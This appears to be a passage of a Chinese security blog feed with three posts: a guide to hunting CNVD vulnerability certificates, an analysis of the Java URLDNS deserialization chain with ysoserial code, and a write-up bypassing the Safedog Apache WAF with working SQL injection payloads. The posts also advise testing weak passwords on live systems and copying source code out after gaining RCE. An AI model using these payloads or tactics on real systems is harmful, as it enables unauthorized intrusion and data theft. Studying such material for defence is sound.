successful"></p><p>注册资产超过5000万，这套系统就满足发放证书的基本条件了，我们就可以进行一个挖掘，假如没超过5000万，我们就不用进行挖掘了，因为即使是挖到了洞，也不满足发放证书的条件。本人自己在最初挖掘CNVD证书的时候就是利用空间测绘这种方法，找满足条件的系统，然后进行挖掘。自己第一次挖掘CNVD的时候也是利用这种方法，也是有幸挖掘到一个Elastic的一个0day，然后申请了如下证书。</p><p><img src="/images/pasted-17.png" alt="upload successful"></p><p>这种寻找目标的劣势也很明显，第一就是寻找系统不够精准（需要手动去确定目标是否满足发放证书条件），第二就是需要我们去确定该套系统属于哪一个厂商。就如上两个问题就会浪费大量的时间，导致效率非常的低，所以不是很推荐这种寻找目标的方法。</p><p>第二个方法：利用脚本寻找</p><p>具体脚本如下文</p><p>快速获得CNVD证书的小技巧</p><p>作者：OceanSec<br>文章来源于<a href="https://oceansec.blog.csdn.net/">https://oceansec.blog.csdn.net/</a><br>这个脚本我自己没有使用过，不过其导出5000万漏洞资产，然后再结合一些工具半自动化测试确实适合快速去刷洞。</p><p>第三个方法：在CNVD官网寻找</p><p>这也是我自己使用最多的一个方法，怎么利用CNVD官网去寻找目标呢，首先来到CNVD官网。</p><p>在漏洞列表处，可以看到以往发生的安全漏洞，然后我自己比较喜欢寻找WEB应用的系统，所以我会选择一个WEB应用分类，当然师傅们也可以更具自己擅长挖掘的东西来进行选择。</p><p><img src="/images/pasted-19.png" alt="upload successful"></p><p>可以看到其会报道处某某公司的某某系统存在某某漏洞</p><p><img src="/images/pasted-23.png" alt="upload successful"></p><p>比如这里有个某某公司，那我们就可以利用爱企查去查询一下这个公司的注册资产，如果超过5000万，满足发放证书条件，那我们就可以根据这个提示去试着寻找一下这个系统，找到之后呢，我们可以利用我们平常的测试手段，尽量模仿打一下CNVD官网所通报出来的漏洞，据我打过多个的经验来看，大多数都是能打到的，找到漏洞点进行漏洞复现的。当然测试到了漏洞点，你可以尝试提交一下，不过百分之99的概率是重复的，既然重复为什么还要在这寻找目标呢。</p><p>① 其实这个系统爆出一个漏洞，其实在某种程度上，其系统的安全性就与其他相比来说较低的，那我们就可以对这个系统进行一个详细的测试，细心一点测试的话，你就会收获到一些惊喜。</p><p>② 有些系统我们测试一下弱口令，假如我们测试出来弱口令（web应用系统的弱口令CNVD是不收录的），我们可以进入后台再进行一个深度挖掘。</p><p>③ 假如CNVD爆出的是某某可以getshell的漏洞，我们可以尝试复现，假如复现成功的话，我们可以把源代码打包备份一份出来，进行一个黑盒加白盒的深度测试。</p><p>其上三个方法呢，由前到后提交漏洞重复的概率会依次降低。在发现存在某个漏洞后，我们还可以去寻找该公司的其他系统，看看该公司其他公司是否也存在该种类型的漏洞（因为一个公司不同的系统很有可能是一个开发团队写出来的，一个系统存在问题，那么其开发的另一个系统也很大概率存在该问题），那么怎么寻找该公司的其他问题呢。我们利用爱企查查询一个企业过后，我们可以来到知识产权，然后点击软件著作权信息。</p><p><img src="/images/pasted-25.png" alt="upload successful"></p><p>这里就可以寻找一些该公司开发的其他公司系统信息</p><p><img src="/images/pasted-27.png" alt="upload successful"></p><p>运气好碰到类似的系统的话，就可以开心地把一份报告变成两份报告，拿两份证书。</p><h1 id="0x06-挖掘思路"><a href="#0x06-挖掘思路" class="headerlink" title="0x06 挖掘思路"></a>0x06 挖掘思路</h1><p>掌握了收集资产的方法，接下来需要的就是一定的挖掘技巧，在挖CNVD的过程中也存在一些经常挖到的漏洞种类和一些小小的挖掘技巧。</p><p>① 大型框架导致的漏洞（如log4j2，shiro身份绕过等等）</p><p>大型框架导致的0day，特别是最新爆发的核弹级漏洞log4j2，在平常的测试过程中可以注意一下这种框架漏洞。（log4j2证书鉴赏）</p><p><img src="/images/pasted-28.png" alt="upload successful"></p><p>② 目录扫描、源代码、js文件、修改请求返回状态码探针后台地址挖掘未授权漏洞</p><p>自己在挖掘这些系统的时候，经常可以挖掘都未授权访问漏洞，挖掘未授权的方法，我们可以使用目录扫描，在源代码中、js文件中查看一些后台的url，还可以通过修改请求的状态码如把0改为1，false改为true等让系统跳转后台地址等。</p><p>③ 通过弱口令进入后台挖掘</p><p>前台的功能点功能较少，假如某个系统存在弱口令，我们就可以进入后台，扩大我们的攻击面（挖掘例子如下）</p><p>详细记录一次CNVD原创漏洞证书挖掘过程</p><p>④ 设备弱口令漏洞</p><p>虽然CNVD已经不收录WEB应用的弱口令的通用洞了，但是一些设备的弱口令漏洞其还是正常收录的。当然设备弱口令你挖掘到非常简单，但是你想挖掘到没有重复的那也是相当的卷，所以你想通过挖掘设备弱口令来获取证书的话，你就要去时刻关注这些设备厂商的动态，在其发布新设备的第一时间就去测试该新设备的弱口令，然后用上你最快的手速写好报告，提交报告，然后坐等证书。</p><p>⑤ RCE打包源码进行代码审计</p><p>当你RCE一个系统的时候，你可以把该系统的源代码打包一份出来，然后通过白盒的方式去审核源代码，进一步扩大战果。</p><h1 id="0x07-结尾"><a href="#0x07-结尾" class="headerlink" title="0x07 结尾"></a>0x07 结尾</h1><p>大概挖掘思路就是这些，当然可能还有一些没有想到的没有写上来，以后想起来的单独写写。</p><p><img src="/images/pasted-29.png" alt="upload successful"></p><p>最后祝师傅们证书满满。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS反序列化链分析</title>
      <link href="/2023/04/30/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/04/30/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>URLDNS是Java反序列化上最简单的一条链了，按实际效果来说它并不能被称为一条漏洞利用链，因为它不能执行命令，它的参数是一条URL，最终达到的效果是触发一次DNS请求。但是由于这条链没有依赖任何第三方的库，所以特别适合用来探测是否存在反序列化漏洞。</p><h1 id="HashMap的put方法触发dns请求"><a href="#HashMap的put方法触发dns请求" class="headerlink" title="HashMap的put方法触发dns请求"></a>HashMap的put方法触发dns请求</h1><p>我们先来看看如下这段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://oma19i.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后我们看看dnslog平台的请求情况</p><p><img src="/assets/image-20230423173846-krvusbm.png" alt="image.png"></p><p>可以看到dnslog平台接收到dns请求，那么具体哪里触发了dns请求呢，我们可以来调试一下。</p><p><img src="/assets/image-20230423174054-am2wq36.png" alt="image.png"></p><p>跟进put方法</p><p><img src="/assets/image-20230423193315-c9iej0y.png" alt="image.png"></p><p>这里有个putVal方法，它是哈希表结构存储函数并不是我们关注的重点，可以看到putVal里面是调用了hash函数的，这里调用hash函数是HashMap为了保持传入的key唯一，所以需要对key做一个hash处理。那继续跟进hash方法</p><p><img src="/assets/image-20230423193342-ry7mgj8.png" alt="image.png"></p><p>判断key是否为null，不为null则调用key.hashCode，再跟进key.hashCode</p><p><img src="/assets/image-20230423193400-t2826su.png" alt="image.png"></p><p>这里判断hashCode值是否为-1，假如等于-1的就直接返回hashCode，hashCode在如下位置赋值</p><p><img src="/assets/image-20230423193418-uyspkb8.png" alt="image.png"></p><p>所以if语句里的条件不成立，所以继续走到handler.hashCode，这里的handler是URLStreamHandler的一个实例（此处留意一下这个handler）</p><p><img src="/assets/image-20230423193435-xmnlpg7.png" alt="image.png"></p><p>继续跟进handler.hashCode</p><p><img src="/assets/image-20230423193815-m6p9nwj.png" alt="image.png"></p><p>发现会调用getHostAddress这个方法，继续跟进</p><p><img src="/assets/image-20230423194007-gqmzmcp.png" alt="image.png"></p><p>发现调用getByName方法，也就是这个函数发送了dns请求</p><p><img src="/assets/image-20230423194431-aqa3qp4.png" alt="image.png"></p><p>搞明白了为什么会发生dns请求之后呢，再来分析分析URLDNS这条链</p><h1 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h1><p>先看看ysoserial生成的payload代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它new了一个SilentURLStreamHandler</p><p><img src="/assets/image-20230423200918-sluvcrh.png" alt="image.png"></p><p>而SilentURLStreamHandler继承了URLStreamHandler然后重写了如下两个方法</p><p><img src="/assets/image-20230423201020-d8tdik4.png" alt="image.png"></p><p>还记得我们在分析使用put方法是会触发dns请求让留意了一下handler</p><p><img src="/assets/image-20230423205459-izhitm6.png" alt="image.png"></p><p>前面说了handler是URLStreamHandler的一个实例，重写了URLStreamHandler里的openConnection方法和getHostAddress方法目的就是为了防止在生成payload的时候触发了dns请求。</p><p>至此为止，我们所有分析的代码都没有涉及到反序列化，那么利用反序列化去构造这条链呢。上面分析了那么久HashMap的put方法触发dns请求，那么今天的主角毋庸置疑也是HashMap这个类，反序列化会触发readObject方法，那么直接进入到HashMap的readObject方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该方法的最后一行，见到了熟悉的一行代码</p><p><img src="/assets/image-20230423224902-tqq44xw.png" alt="image.png"></p><p>那么这条链不就跑通了吗，最后我们以漏洞利用的方式来重新捋一捋</p><p>首先我们利用ysoserial生成一个URLDNS的payload</p><p><img src="/assets/image-20230423225338-rzgeb9y.png" alt="image.png"></p><p>然后创建一个反序列化入口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        unserialize(<span class="string">&quot;dnstest.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassCastException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在HashMap类的readObject方法如下代码处打上一个断点</p><p><img src="/assets/image-20230423225557-dma25kz.png" alt="image.png"></p><p>然后进行调试，程序成功走到我们的断点处</p><p><img src="/assets/image-20230423225749-t3v79t6.png" alt="image.png"></p><p>跟进hash方法</p><p><img src="/assets/image-20230423225906-eb313o1.png" alt="image.png"></p><p>跟进key.hashCode</p><p><img src="/assets/image-20230423225937-t6can6f.png" alt="image.png"></p><p>跟进handler.hashCode</p><p><img src="/assets/image-20230423230025-7rxqf8d.png" alt="image.png"></p><p>跟进getHostAddress</p><p><img src="/assets/image-20230423230146-a347lep.png" alt="image.png"></p><p>成功执行到getByName函数触发dns请求</p><p><img src="/assets/image-20230423230242-vindcag.png" alt="image.png"></p><h1 id="利用链挖掘角度分析URLDNS链"><a href="#利用链挖掘角度分析URLDNS链" class="headerlink" title="利用链挖掘角度分析URLDNS链"></a>利用链挖掘角度分析URLDNS链</h1><p>如上的分析都是我们以一个漏洞分析者去正向的分析这条链子，那么以漏洞挖掘者的身份我们就要倒过来看这条链了，首先我们从getByName这个函数开始，这个函数可以触发dns请求，那么我们看看谁调用了这个函数，我么可以点击这个函数，然后用Ctrl+Alt+H来查看这个函数的调用关系</p><p><img src="/assets/image-20230424110243-jycoilw.png" alt="image.png"></p><p>然后就是逐步去看这些函数，是否能构造反序列化链，构造需要我们要注意三个事情</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、参数可控</span><br><span class="line"><span class="number">2</span>、类可反序列化，继承了序列化接口</span><br><span class="line"><span class="number">3</span>、最终走到反序列化触发的readObject</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230424111832-0ps308e.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站安全狗APACHE版V4.0绕过</title>
      <link href="/2023/04/29/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E7%8B%97APACHE%E7%89%88V4-0%E7%BB%95%E8%BF%87/"/>
      <url>/2023/04/29/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E7%8B%97APACHE%E7%89%88V4-0%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在记忆里上次绕安全狗还是在上次，开开心心把自己之前绕过狗的payload拿出来，发现全部被拦截了，事情一下子就严肃起来了，这就开整。<img src="/assets/image-20220210101102-k2p13gt.png" alt="image.png"></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本次环境如下sqli-lab的sql注入靶场</span><br><span class="line">网站安全狗APACHE版V4.0版本的最高防护等级</span><br></pre></td></tr></table></figure><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p>首先先来分析分析以前以前绕过的Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union/*!10440*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p>其中这里的10440数字经过fuzz可以替换的有如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10440–10449 13440-13449 14400-14499 15440-15449 16440-16449 17440-17449 18440-18449 等等</span><br></pre></td></tr></table></figure><p>但是在更新后的安全狗后这些payload已经全部被拦截</p><p><img src="/assets/image-20220210112947-p973ryj.png" alt="image.png"></p><p>到这就不得不提提安全狗之前的匹配规则了，我们单独union不会被拦截</p><p><img src="/assets/image-20220210102704-nrcpsi2.png" alt="image.png"></p><p>单独select也不会被拦截</p><p><img src="/assets/image-20220210102744-tm2k93h.png" alt="image.png"></p><p>但是union和select放一起组合就会被匹配出来，然后被安全狗所拦截</p><p><img src="/assets/image-20220210102844-j4t2eo1.png" alt="image.png"></p><p>基于这个特性，我们利用之前的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union/*!10440*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p>是可以绕过老版本的安全狗的，这里在union和select中间加入了一个&#x2F;*!10440*&#x2F;，众所周知在mysql中&#x2F;*!…*&#x2F;不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在&#x2F;*!…*&#x2F;中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。</p><p>所以union&#x2F;*!10440*&#x2F;select等价于union select,且绕过了安全狗对union和select字符一起组合的检测</p><p><img src="/assets/image-20220210113247-o80q334.png" alt="image.png"></p><p><img src="/assets/image-20220210113309-8ovvx1n.png" alt="image.png"></p><p>但是安全狗更新之后，所有的payload都已经失效，那么我们猜测一下，安全狗更新后是不是匹配union和select之间所有的字符，匹配到之后用空字符替换，再检测是否存在union select组合，为了验证这个猜测我们对我们的payload进行fuzz验证一下</p><p>跑了一些特殊的字符发现都被拦截<img src="/assets/image-20220210104653-4fuct55.png" alt="image.png"></p><p>但是唯独有一个符号没有被返回的length长度不一样</p><p><img src="/assets/image-20220210105306-j317gqe.png" alt="image.png"></p><p>按我们看看这个’#’会擦出什么爱情的火花</p><p>我们利用如下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union/*!test01#test02*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210105529-1seiqqq.png" alt="image.png"></p><p>此处我们搞清楚一个流程，我们的语句发送过去，首先接收安全狗检测，安全狗检测到’#’号，所以’#‘后面的都会被截断抛弃，所以安全狗只能匹配到’#‘前的union，但是没匹配到’#‘后的select，所以通过安全狗。在通过安全狗后我们的语句被数据库接收，数据库此处处理过程和安全狗处理流程一样，都是只能匹配到’#‘前的union，但是没匹配到’#‘后的select，最终导致语句不完整导致最后的报错。</p><p>说到这里我们究竟要怎么去绕过这个可恶的安全狗呢，我们想象这么一个场景，首先我们的’#‘被安全狗识别，但是在我们的SQL语句中并不识别这个’#‘，这样我们就可以达到绕过安全狗而且保持正确的SQL语句来实现我么的注入。</p><p>我们来看下下面两语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM number WHERE home_id =1 LIKE &quot;[%23]&quot;;</span><br><span class="line">SELECT * FROM number WHERE home_id =1 LIKE &quot;[%23]&quot; union select * FROM number;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210111606-4sc540e.png" alt="image.png"></p><p><img src="/assets/image-20220210111634-q48r6c9.png" alt="image.png"></p><p>此处SELECT * FROM number WHERE home_id &#x3D;1 LIKE “[%23]”;查出来一个空表</p><p>所以SELECT * FROM number WHERE home_id &#x3D;1 LIKE “[%23]” union select * FROM number;相当于select * FROM number；</p><p>该语句是存在一个LIKE “[%23]”，也正是这个LIKE “[%23]”让我们的SELECT * FROM number WHERE home_id &#x3D;1成为一个空表。</p><p><img src="/assets/image-20220210111930-hwjeqmo.png" alt="image.png"></p><p><img src="/assets/image-20220210112007-qm4enya.png" alt="image.png"></p><p>那么这个语句有什么用的，可以发现我们的LIKE “[%23]”中有一个%23，众所周知#的url编码是%23，那么这条语句带入到安全狗中，安全狗会不会识别这个#呢，带着这样的猜想我们构造如下payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union select*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210113656-jmvg52w.png" 